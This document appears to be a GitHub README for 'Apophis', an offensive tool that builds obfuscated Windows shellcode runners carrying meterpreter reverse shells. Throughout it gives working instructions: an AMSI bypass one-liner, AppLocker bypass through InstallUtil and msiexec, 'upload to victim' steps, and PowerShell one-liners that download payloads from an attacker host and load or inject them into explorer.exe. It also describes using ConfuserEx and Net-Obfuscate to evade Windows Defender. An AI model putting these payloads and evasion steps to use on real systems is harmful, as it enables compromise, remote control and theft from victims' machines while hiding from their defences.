# Description
```Apophis``` project is a Bash script that leverages tools such as ```DotNetToJScript```, ```ConfuserEx```, ```Net-Obfuscator``` etc. in order to generate 'Shellcode runners' in various formats. To accomplish this, it uses Csharp templates that are compiled with **Mono .Net Framework**. 

Apep (also spelled Apepi or Aapep) or Apophis (/əˈpoʊfɪs/;[1] Ancient Greek: Ἄποφις) was the ancient Egyptian deity who embodied chaos (ı͗zft in Egyptian) and was thus the opponent of light and Ma'at (order/truth). He appears in art as a giant serpent. His name is reconstructed by Egyptologists as *ʻAʼpāp(ī), as it was written ꜥꜣpp(y) and survived in later Coptic as Ⲁⲫⲱⲫ Aphōph.[2] Apep was first mentioned in the Eighth Dynasty, and he was honored in the names of the Fourteenth Dynasty king 'Apepi and of the Greater Hyksos king Apophis. - https://en.wikipedia.org/wiki/Apep

### What kind of shellcode runners it generates?
- XOR (.exe, .dll)
- Caesar (.exe, .dll)
- AMSI Bypass (Patching, Unhooking)
- TripleDES (.exe)
- ASPX, Web.Config 
- HTA, JS, XSL
- MSI
- InstallUtil (.exe)

## Installation
```Apophis``` is using heavily the ```Mono``` project in order to compile the CS templates.

```
sudo apt-get install mono-complete
```

If your Linux host can't resolve the IP address, then try the following:
```
wget -q -O https://archive.kali.org/archive-key.asc | sudo apt-key add
sudo apt update
sudo apt-get install mono-complete
```

```
git clone https://github.com/tasox/Apophis
```
```
chmod +x apophis.sh
./Apophis
```

### Download Wix binaries

To generate an ```.MSI``` wrapper, you need first to download the ```wix311-binaries.zip``` and to unzip it under the ```MSI directory```.

**Note:** The folder MUST have the name ```wix311-binaries```. 

```
cd Templates/MSI/
wget https://github.com/wixtoolset/wix3/releases/download/wix3112rtm/wix311-binaries.zip
unzip wix311-binaries.zip
```

```
cd MSI/wix311-binaries

┌──(kali㉿kali)-[~/…/Templates/MSI/wix311-binaries]
└─$ ls -ltr
total 14388
-rw-r--r--  1 kali kali    3369 Sep 15  2019 LICENSE.TXT
-rw-r--r--  1 kali kali  169832 Sep 15  2019 mergemod.dll
-rw-r--r--  1 kali kali  501248 Sep 15  2019 mergemod.cub
-rw-r--r--  1 kali kali    4233 Sep 15  2019 lux.targets
-rw-r--r--  1 kali kali  694784 Sep 15  2019 darice.cub
-rw-r--r--  1 kali kali   61952 Sep 15  2019 mspatchc.dll
...
```
The Wix binary (```light.exe```) that is responsible to generate your .MSI file, it needs the ```msi.dll```. For this reason, you need to install Wine (if you don't have it already) or to update it to the latest version, to avoid errors related to msi.dll.

### Install/Updating Wine on KALI

```
echo deb-src https://dl.winehq.org/wine-builds/debian/ buster main >> /etc/apt/sources.list
apt update
apt install winehq-stable
winecfg
```

## Usage

### Folders
| Name | Description |
| --- | --- |
| Templates | Containing Shellcode Runners with and without encryption in various formats. |
| payloads | Containing Shellcode Runners that can executed. |
| ConfuserEx | Compiled files of ConfuserEx GitHub project. |
| Net-Obfuscate | Compiled files of Net-Obfuscate GitHub project.|


### Static Variables (Needs to modified)
Open with a text editor the bash file ```apophis.sh``` and edit the variables accordingly.

| Variables | Description |
| --- | --- |
| PROCESS_TO_INJECT | Contains the remote process name that you want to inject into. |
| MSFVENOM_PAYLOAD | MSF Payload |
| LHOST | Listener IP |
| LPORT | Listener Port | 

```
#!/bin/bash
...
PROCESS_TO_INJECT="explorer.exe"
MSFVENOM_PAYLOAD="windows/x64/meterpreter/reverse_tcp"
LHOST="192.168.100.128"
LPORT=443
...
```

### Payload prefixes
| Name | Description |
| --- | --- |
| _embedded | On the folder ```payloads/3DES/```, if the generated payload contains the word **embedded**, it means the **shellcode** is located inside the generated shellcode runner. |
| _marshal | If the generated payload contains the word **marshal** then payload will be injected to executable's memory space. |
| _numa | If the generated payload contains the word **numa** then **VirtualAllocExNuma** was used insetad of **VirtualAllocEx** |
| _FlsAlloc | If the generated payload contains the word **FlsAlloc** then **FlsAlloc** API was used. |


#### Payload Example
When payload is generated with name ```shellcode_runner_assembly_FlsAlloc_marshal.exe```, it means:
- ```FlsAlloc``` API was used
- The Shellcode will be injected to executable's address space (Not to a remote process).

```
┌──(kali㉿kali)-[~/…/payloads/XOR]
└─$ ls -la                                                                                                                                                                                      127 ⨯
total 144
drwxr-xr-x 2 kali kali  4096 Mar 10 02:45 .
drwxr-xr-x 9 kali kali  4096 Feb  2 08:20 ..
-rwxr-xr-x 1 kali kali  5632 Mar 10 02:45 shellcode_runner_assembly.dll
-rwxr-xr-x 1 kali kali  5632 Mar 10 02:45 shellcode_runner_assembly.exe
-rwxr-xr-x 1 kali kali  5120 Mar 10 02:45 shellcode_runner_assembly_FlsAlloc_marshal.dll
-rwxr-xr-x 1 kali kali  5120 Mar 10 02:45 shellcode_runner_assembly_FlsAlloc_marshal.exe
-rwxr-xr-x 1 kali kali  5632 Mar 10 02:45 shellcode_runner_assembly_numa.dll
-rwxr-xr-x 1 kali kali  5632 Mar 10 02:45 shellcode_runner_assembly_numa.exe
-rwxr-xr-x 1 kali kali  5632 Mar 10 02:45 shellcode_runner_assembly_numa_marshal.dll
-rwxr-xr-x 1 kali kali  5632 Mar 10 02:45 shellcode_runner_assembly_numa_marshal.exe
-rwxr-xr-x 1 kali kali 65131 Mar 10 02:45 shellcode_runner_cpp.exe
-rwxr-xr-x 1 kali kali  6144 Jan 24 23:05 shellcode_runner.dll

```

---
## 1. Shellcode Runners

### 1.1 Triple DES

The 3DES shellcode runners are located under ```payloads/3DES/``` directory with names:
- des_decryptor.exe
- des_decryptor_embedded.exe
- des_decryptor_embedded_marshall.exe

Password, Salt and IV are static values but you can modified them as you need.

- **Password**: oqphnbt0kuedizy4m3avx6r5lf21jc8s
- **Salt**: vh9b4tsxrl1560wg8nda2meuc7yjzop3
- **InitialVector**: SBFTWSDXBYVOEMTD


### 1.1.1 Execution of des_decryptor.exe (Needs the path of Shellcode Runner)
The executable **des_decryptor.exe** doesn't contain a shellcode in it. For this reason, we have to provide a shellcode runner from the command-line. There are two 3DES encrypted Shellcode runners that you can put either to a Web or to an SMB Server:
- des_decryptor_embedded.exe (It will inject the shellcode into the remote process that you have provided in the ```line 11 of apophis.sh```)
- des_decryptor_embedded_marshal.exe (It will inject the shellcode into ```des_decryptor.exe```)


**Steps**
- Copy any 3DES Shellcode runner that is located under ```payloads/3DES/``` to your Web/SMB Server
- Upload ```des_decryptor.exe``` to victim
- Execute it as follows

```
cmd> des_decryptor.exe http://KALI_IP/des_decryptor_embedded.exe
cmd> des_decryptor.exe smb://KALI_IP/des_decryptor_embedded.exe

cmd> des_decryptor.exe http://KALI_IP/des_decryptor_embedded_marshal.exe
cmd> des_decryptor.exe smb://KALI_IP/des_decryptor_embedded_marshal.exe
```

### 1.1.2 Execution of des_decryptor_embedded.exe
The executable ```des_decryptor_embedded.exe``` embeds the shellcode in base64, which before was ecrypted with ```TripleDESEncryptor.ps1```. Doesn't need command-line arguments for the execution. 

```
It will inject the shellcode into the remote process that you have provided in the line 11 of apophis.sh
```

**Steps**
- Upload the file to the victim
- Execute it as follows:

```
cmd> des_decryptor_embedded.exe
```

### 1.1.3 Execution of des_decryptor_embedded_marshal.exe
The executable ```des_decryptor_embedded_marshal.exe``` embeds the shellcode in base64, which before was ecrypted with ```TripleDESEncryptor.ps1```. Doesn't need command-line arguments for the execution. 

```
It will inject the shellcode to a memory space inside des_decryptor_embedded_marshal.exe process.
```

**Steps**
- Upload the file to the victim
- Execute it as follows:

```
cmd> des_decryptor_embedded_marshal.exe
```

----
### 1.2 AMSI Bypass
There are two methods to bypass AMSI:
- Patching 
- Unhooking

Nice resource to have:
- https://amsi.fail/ 


### 1.2.1 Method 1 (Patching)
The execution of 1st method (Patching) is straight forward and uses well-known methodologies.

```
$m="System.Management.Automation.Ams";[Ref].Assembly.GetType("$m"+"iUtils").GetField('amsiInitFai'+'led','NonPublic,Static').SetValue($null,$true)
```

OR you can patch AMSI as follows.
```
# XOR RAX,RAX 
$buf = [Byte[]] (0x48,0x31,0xC0)  
```

**Execute AMSI Shellcode runner**

You can copy the ```payloads/AMSI/shellcode_runner.txt``` to your web server as ```shellcode_runner.html```
``` 
powershell -nop -exec bypass -c IEX((New-Object Net.WebClient).DownloadString('http://<IP>/shellcode_runner.html')); 
``` 

### 1.2.2 Method 2 (Unhooking)
To unhook AMSI, I've used the project by **jfmaes - AmsiHooker** (https://github.com/jfmaes/AmsiHooker) and I've done some small modifications. When AmsiHooker executable will launched, it will download the Shellcode Runner from your web server and it will reflectively execute it.

**Steps**
1. Upload ```unhook_amsi.exe``` and ```MinHook.NET.dll``` to victim. (Files located under ```payloads/AMSI/```)
2. Copy your shellcode runner (```payloads/XOR/``` or ```payloads/Caesar/```) to your web server folder.
3. ```unhook_amsi.exe http://<KALI>/shellcode_runner.exe```

---
### 1.3 Executing .XSL, .JS, .HTA

Under directory ```payloads/DotNetToJScript/```, you'll find three shellcode runners that are generated by **DotNetToJScript** (https://github.com/tyranid/DotNetToJScript). 

**Executing .XSL shellcode runner**
```
wmic process list /FORMAT:evil.xsl
wmic os get /FORMAT:"https://example.com/evil.xsl"
```

**Executing .HTA shellcode runner**
```
mshta c:\users\public\shellcode_runner.hta
```

**Executing .JS shellcode runner**
```
wscript c:\users\public\shellcode_runner.js
```

More execution methods can be found:
- https://lolbas-project.github.io/

---
### 1.4 ConfuserEx + Net-Obfuscator

During my tests, I noticed that Windows Defender could detect payloads genereted by **ConfuserEx** (https://github.com/yck1509/ConfuserEx). For this reason, I combined ```ConfuserEx + Net-Obfuscator``` (https://github.com/BinaryScary/NET-Obfuscate). 

First, payloads that are located under ```payloads/XOR/``` and ```payloads/Caesar/``` directories, feed the **ConfuserEx** tool and subsequently the new obfuscated binaries are imported to **Net-Obfuscator**. As a result, the GetType and GetMethod values are obfuscated and  dynamically created.

**Example 1** - Execution of ```payloads/Caesar/shellcode_runner_assembly_numa.exe``` Reflectively.
```
[+] Creating DLL/EXE file (ConfuserEx + .NET Obfuscator) ...

 [!] Obfuscating CAESAR -> shellcode_runner_assembly_numa.exe
 [*] PS>$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')
 [*] PS>$ass=[System.Reflection.Assembly]::Load($data)
 [*] PS>$ass.GetType("J46IIOTXPW.PZAZUJAD4V").GetMethod("NK6WAROB2W").Invoke($null,$null)
```
-----
### 1.5 Generating MSI

To generate an ```.MSI``` shellcode runner, ```Apophis``` is using ```Mono```,```Wine``` and the ```XML``` template by Adam Chester. If you don't have  ```Wine``` installed, pls follow the steps described on the ```Installation``` section. 

The created ```shellcode_runner.msi``` is located under ```payloads/MSI/```. To successfully exploit this method, you need to follow the steps:

**Steps**
- Modify the ```line 16``` on ```Templates/MSI/shellcode_runner.xml```
- Generate the ```shellcode_runner.msi```
- Execute it: ```msiexec /q /i http://KALI_IP/shellcode_runner.msi```

**Good read**:
- https://blog.xpnsec.com/becoming-system/ 


### 1.5.1 Generating MSI (manually)

In case you want to generate manually the MSI, follow the process bellow. 

**Edit the shellcode_runner.xml**

The file ```shellcode_runner.xml``` is located under the folder ```Templates/MSI/```. Modify the ```line 16``` as you wish.

```
...
<Property Id="cmdline">C:\\Windows\\temp\\shellcode_runner.exe</Property>
...
```

**Creating .wixobj file**

```
cd Templates/MSI/wix311-binaries
mono candle.exe -out ../ -arch x64 ../shellcode_runner.xml
```

**Generating .MSI**

```
cd Templates/MSI/wix311-binaries
wine light.exe -out ../shellcode_runner.msi ../shellcode_runner.wixobj -sval
cp shellcode_runner.msi payloads/MSI/
```

**Execution**

```
msiexec /q /i shellcode_runner.msi
msiexec /q /i http://KALI_IP/shellcode_runner.msi
```
![image](https://user-images.githubusercontent.com/9944198/158667046-e0f6264e-0cb5-46b9-99e7-0b9775c4bc8f.png)

---

### 1.6 InstallUtil
There are a lot of methods to bypass Applocker and ```InstallUtil``` is one of them. In some case you can also leverage the ```MSIEXEC``` to tackle this restriction. The template for ```InstallUtil``` is under ```Templates/Applocker/```. If you want to modify the default execution method of the shellcode runner, which is via ```Reflection```, you can edit the ```line 21``` of the Template, and comment/remove the part inside ```Apophis.sh``` that is related to ```InstallUtil``` (line 126).


```
[line 21] String cmd = "powershell -nop -exec bypass -c \"$data=(New-Object Net.WebClient).DownloadData('http://KALI_IP/shellcode_runner.exe');$ass=[System.Reflection.Assembly]::Load($data);$ass.GetType('Runner.TestClass').GetMethod('Main').Invoke($null,@(,$null))\"";
```

**Execution Steps:**
- Upload ```payloads/Applocker/InstallUtil.exe``` to Victim.
- Execute it: 
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Temp\InstallUtil.exe
```
---

### 1.7 AES + Compression
There are two templates that encrypts a shellcode runner using AES + Compression method. These teplates are located under ```templates/AES/``` directory:
- AES_Deflate_HTTP.cs
- AES_Deflate_SMB.cs

To successfully launch this type of attack, you need first to copy the preferred shellcode runner ```XOR``` or ```Caesar``` to an SMB or HTTP server and rename it as ```shellcode_runner.exe```. The default SMB name, it is called **visualstudio**, however you can edited as you wish and provide the one that you already have. Just remember to modify the **line 124** of the template ```Templates/AES/AES_Deflate_SMB.cs``` 

```
...
    public static void Main(string[] args)
    {
        ruleThemAll("\\\\KALI_IP\\visualstudio\\shellcode_runner.exe");
        
    }
...        
```

**Execution Steps**
- Upload 'AES_Deflate_SMB.exe' or 'AES_Deflate_HTTP.exe' to the victim
- Copy any shellcode runner that is located under ```payloads/Caesar/``` or ```payloads/XOR/``` directory to an SMB or Apache folder and rename it as ```shellcode_runner.exe```. Default folder name for SMB share is **visualstudio**. 
- Execution with Reflection:
```
PS> $data=[IO.File]::ReadAllBytes('C:\Users\user\Desktop\AES_Deflate_SMB.exe')
PS> $ass=[System.Reflection.Assembly]::Load($data)
PS> $ass.EntryPoint.Invoke($null,@($null))
```
---
## 2. Execute .Net Assemblies with Reflection
Bellow you can see some examples of how you can execute the Shellcode Runners with reflection.

```
[+] Assembly - Local Execution or via SMB [+]
$data=[IO.File]::ReadAllBytes('shellcode_runner.exe|dll')
$ass=[System.Reflection.Assembly]::Load($data)
$ass.GetType("Runner.TestClass").GetMethod("Main").Invoke($null,@(,$null))

[+] Assembly - Remote Execution  [+]
$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')
$ass=[System.Reflection.Assembly]::Load($data)
$ass.GetType("Runner.TestClass").GetMethod("Main").Invoke($null,@(,$null))

```
---
## 3. Downloaders (One-Liners)

### 3.1 DownloadData + Reflection (No Proxy aware)
```
powershell -nop -exec bypass -c "$data=(New-Object Net.WebClient).DownloadData('http://KALI_IP/shellcode_runner.dll|exe');$ass=[System.Reflection.Assembly]::Load($data);$ass.GetType('Runner.TestClass').GetMethod('Main').Invoke($null,@(,$null))"
```

### 3.2 DownloadData + Invoke-ReflectivePEInjection
```
powershell -nop -exec bypass -c "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.136/shellcode_runner_assembly.exe');(New-Object System.Net.WebClient).DownloadString('http://KALI_IP/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid"
```

### 3.3 DownloadString + AMSI Bypass + Proxy aware
```
powershell -nop -exec bypass -c "$proxyAddr=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | Select-Object ProxyServer).ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy(\"http://$proxyAddr\");$webclient=(New-Object System.Net.WebClient);$userAgent=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent';$webClient.Headers.Add(\"User-Agent\", $userAgent);$webClient.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$webClient.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;$bytes=$webclient.DownloadString('http://KALI_IP/shellcode_runner.txt')|IEX;"
```

### 3.4 DownloadData + Proxy aware
```
powershell -nop -exec bypass -c "$proxyAddr=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | Select-Object ProxyServer).ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy(\"http://$proxyAddr\");$webclient=(New-Object System.Net.WebClient);$userAgent=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent';$webClient.Headers.Add(\"User-Agent\", $userAgent);$webClient.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$webClient.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;$data = $webclient.DownloadData('http://KALI_IP/shellcode_runner.dll|exe');$ass=[System.Reflection.Assembly]::Load($data);$ass.GetType('Runner.TestClass').GetMethod('Main').Invoke($null,@(,$null))"
```
---
## 4. Output
If everything goes well then:

```
──(kali㉿kali)-[~/…/Apophis]
└─$ ./apophis.sh
[+] Generating a shellcode ...
[+] Reading the shellcode.txt ...
[+] Appending Shellcode ...
[+] Compile the CS file...
[+] Generating Encrypted shellcodes ...
[+] Creating DLL ...
[+] Creating EXE ...
[+] Creating C++ EXE (plus UPX) ...
[+] Creating JS ...
[+] Creating HTA ...
[+] Creating XSL ...
[+] Creating TXT ...
[+] Creating MSI ...
[+] Creating web.config file (Non-Encrypted)...
[+] Creating ASPX file (Non-Encrypted) ...
[+] Unhooking AMSI ...
[+] Generating a 3DES Shellcode Runner ...
[+] Creating DLL/EXE file (ConfuserEx + .NET Obfuscator) ...


 _____________________________________________________________________________________________________________________________________
|                                                     Unhooking AMSI                                                                  |
|-------------------------------------------------------------------------------------------------------------------------------------|
| [1] Upload unhook_amsi.exe and MinHook.NET.dll to the victim                                                                        |
| [2] Execution: unhook_amsi.exe http://192.168.100.128/shellcode_runner.exe                                                          |
|_____________________________________________________________________________________________________________________________________|

 _____________________________________________________________________________________________________________________________________
|                                                     Triple DES Execution                                                            |
|-------------------------------------------------------------------------------------------------------------------------------------|
| [1] Example: des_decryptor.exe "http://192.168.100.128/des_decryptor_embedded.exe"                                                  |
| [2] Example: des_decryptor.exe "http://192.168.100.128/des_decryptor_embedded_marshal.exe"                                          |
| [3] Example: des_decryptor_embedded.exe                                                                                              |
| [4] Example: des_decryptor_embedded_marshal.exe                                                                                     |
|_____________________________________________________________________________________________________________________________________|

 _____________________________________________________________________________________________________________________________________
|                                          ConfuserEx  +  Net-Obfuscate Execution                                                     |
|-------------------------------------------------------------------------------------------------------------------------------------|
| [*] Obfusacating 'Caesar' encrypted Shellcode Runner: shellcode_runner_assembly_numa.exe                                            |
|                                                                                                                                     |
| PS>$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.100.128/shellcode_runner_assembly_numa.exe')                |
| PS>$ass=[System.Reflection.Assembly]::Load($data)                                                                                   |
| PS>$ass.GetType("2TU9JGT46F.3CA43C9768").GetMethod("TVT8MQU9ND").Invoke($null,$null)                                                |
|-------------------------------------------------------------------------------------------------------------------------------------|

...More...
```

## 5. Roadmap

- [X] Add a Template for InstallUtil
- [ ] Add command-line arguments

## Acknowledgments
Nothing from all the above couldn't be possible, if these projects didn't exist:
- Mono Team (https://github.com/mono)
- James Forshaw (https://github.com/tyranid/DotNetToJScript)
- Matthew Graeber (https://www.powershellgallery.com/packages/PowerSploit/3.0.0.0/Content/ScriptModification%5COut-EncryptedScript.ps1)
- BinaryScary (https://github.com/BinaryScary/NET-Obfuscate)
- yck1509 (https://github.com/yck1509/ConfuserEx)
- jfmaes (https://github.com/jfmaes/AmsiHooker)


## Contact
Twitter: [@taso_x](https://twitter.com/taso_x)
